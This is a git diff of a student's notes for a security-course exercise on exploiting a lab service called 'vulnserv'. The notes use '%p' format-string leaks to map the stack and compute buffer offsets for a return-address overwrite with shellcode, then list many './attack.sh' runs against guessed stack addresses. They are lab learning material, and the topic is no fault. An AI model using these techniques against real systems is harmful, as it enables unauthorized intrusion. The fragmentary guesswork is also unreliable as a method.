@@ -1,6 +1,7 @@
 # Exercise 4
 ## Jakob Udovic, s1049877
 
+https://www.rapidtables.com/convert/number/hex-to-ascii.html  
 
 After feeding the stack with 300 (290) %p-s, I overwrote all data, except the first 5 registers.  %p-s bytes overwrote everything again, 500 "%p "-s crashed the service.  
 
@@ -11,21 +12,132 @@ After feeding the stack with 300 (290) %p-s, I overwrote all data, except the fi
 After observing the stack with like 50 %p-s, I found out these could be the frame pointer and return address:  
 0x7fffffffec10 0x555555555260
 
+With **231 bytes** long string I have overriten the first return address. We need to remember this number. There is, however, 20 at the end of it, so null bytes will be needed.  
 
+Address looks like this:  
+```
+0x123456789abc20
+```
+
+List/shell code is 33 bytes long.   
+231 - 33 = 198   
+33 byes means 11 "%p " strings since each one consists of 3 ascii characters, 1 byte each.  
+
+75 - 11 = 64  
+
+So we change attack from `./attack.sh 75 0x123456789abc` to `./attack.sh 64 0x123456789abc 0`  
+```
+
+
+```
+But address has still 20 at the end. I solve this by shortening the string from 231 bytes to 230. I get the following:  
+`./attack.sh 63 0x123456789abc 2`  
+Now it's time to use real addresses, I just used 0x123456789abc for easier tracking in terminal..   
+
+
+0x7ffff7f60070   
+
+./attack.sh 63 0x7ffff7f60070 2
 ```
 
 ```
 
+Candidates:
+0x7fffffffec00 (fp1)  
+0x7fffffffec68 (fp2)  
+0x7fffffffec10 (fp3?)  
+0x7ffff7f851f5  
+0x7ffff7f851ce  (fp??)
+0x7fffffffec50  
+0x7ffff7ffdd48 (fp)  
+0x7fffffffee50 (fp dont even count anymore)  
+0x7fffffffee5e (buffer start?)
+
+Temporal calculation:  
+String needs to be 189B.  
+`./attack.sh 61 0x123456789abc`  
+is the same as  
+`./attack.sh 50 0x123456789abc 0`  
+
+We need to add 1 byte of offset to completely override first return address:  
+`./attack.sh 50 0x123456789abc 1`  
+
+
+./attack.sh 50 0x7fffffffee5e 1
+./attack.sh 50 0x7fffffffec00 1
+./attack.sh 50 0x7fffffffec68 1
+./attack.sh 50 0x7fffffffec10 1
+./attack.sh 50 0x7ffff7f851f5 1 ?
+./attack.sh 50 0x7ffff7f851ce 1
+./attack.sh 50 0x7fffffffec50 1
+./attack.sh 50 0x7ffff7ffdd48 1
+./attack.sh 50 0x7fffffffee50 1
+./attack.sh 50 0x7fffffffee5e 1
+./attack.sh 50  1
+./attack.sh 50  1
+
+Bunch of crap on the stack:  
+0x7fffffffee5e  
+0x7fffffffeea0   
+0x7fffffffeeab  
+0x7fffffffef06  
+0x7fffffffef1a  
+0x7fffffffef26  
+0x7fffffffef2c  
+0x7fffffffef3f  
+0x7fffffffef46  
+0x7fffffffef54  
+0x7fffffffef62  
+0x7fffffffef78  
+0x7fffffffef87  
+0x7fffffffefa4  
+0x7fffffffefb8  
+0x7fffffffefd5  
+
+
+By further observing stack and flipping values as in exercise 3 I found:  
+
+Running ./addr.sh for the following values, I got:  
+```
+declare -a arr=("0x4af8a06910402000" "0xcdbc08904063bae9" "xb2c1e117f0365c00" "0x6bc427b1f25ef6a1" "0x34365f363878bf" "0x6c75762f6e69622f" "0x415000767265736e" "0x2f7273752f3d4854" "0x62732f6c61636f6c" "0x2f7273752f3a6e69" "0x69622f6c61636f6c" "0x732f7273752f3a6e" "0x7273752f3a6e6962" "0x62732f3a6e69622f" "0x6e69622f3a6e69" "0x6574783d4d524554" "0x4944444150006d72" "0x41414141413d474e" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x69676f6c6f6e2f6e" "0x6e3d52455355006e" "0x57500079646f626f" "0x415f434c002f3d44" "0x53555f6e653d4c4c" "0x4800382d4654552e" "0x4f53002f3d454d4f" "0x3d4449505f544143" "0x41434f5300343034" "0x313d444950505f54" "0x5f5441434f530033" "0x3d4e4f4953524556" "0x342e332e372e31" "0x3d454d414e474f4c" "0x530079646f626f6e" "0x434f535f5441434f" "0x37313d524444414b" "0x2e37322e37312e32" "0x41434f5300333432" "0x4f504b434f535f54" "0x373333313d5452" "0x45505f5441434f53" "0x313d524444415245" "0x37322e37312e3237" "0x434f53003234322e" "0x50524545505f5441" "0x333633333d54524f" "0x762f6e69622f0038" "0x767265736e6c75")
+```
+```
+x86_64/bin/vulnservPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binTERM=xtermPADDING=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn/nologinUSER=nobodyPWD=/LC_ALL=en_US.UTF-8HOME=/SOCAT_PID=404SOCAT_PPID=13SOCAT_VERSION=1.7.3.4LOGNAME=nobodySOCAT_SOCKADDR=172.17.27.243SOCAT_SOCKPORT=1337SOCAT_PEERADDR=172.17.27.242SOCAT_PEERPORT=33638/bin/vulnserv
+```
+
+
+Nicer:  
+```
+x86_64/bin/vulnserv
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+TERM=xterm
+PADDING=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn/nologin
+USER=nobody
+PWD=/
+LC_ALL=en_US.UTF-8
+HOME=/
+SOCAT_PID=404
+SOCAT_PPID=13
+SOCAT_VERSION=1.7.3.4
+LOGNAME=nobody
+SOCAT_SOCKADDR=172.17.27.243
+SOCAT_SOCKPORT=1337
+SOCAT_PEERADDR=172.17.27.242
+SOCAT_PEERPORT=33638
+/bin/vulnserv
+```
+
+
+
+Just the stack 40B:  
+```
+0x70252070252070 0 0 0 0 0 0 0x555555555257 0x7fffffffec00 0x555555555247 0x7fffffffec68 0x100000000 0x7fffffffec10 0x555555555260 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48
+```
+
 
 
 ```
-
-```
-%p 
-
-
-```
-
+0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x70 0 0 0 0 0 0 0 0 0 0x555555555257 0x7fffffffec00 0x555555555247 0x7fffffffec68
 ```
 
 
@@ -39,3 +151,4 @@ Flag:
 ```
 
 ```
+ 
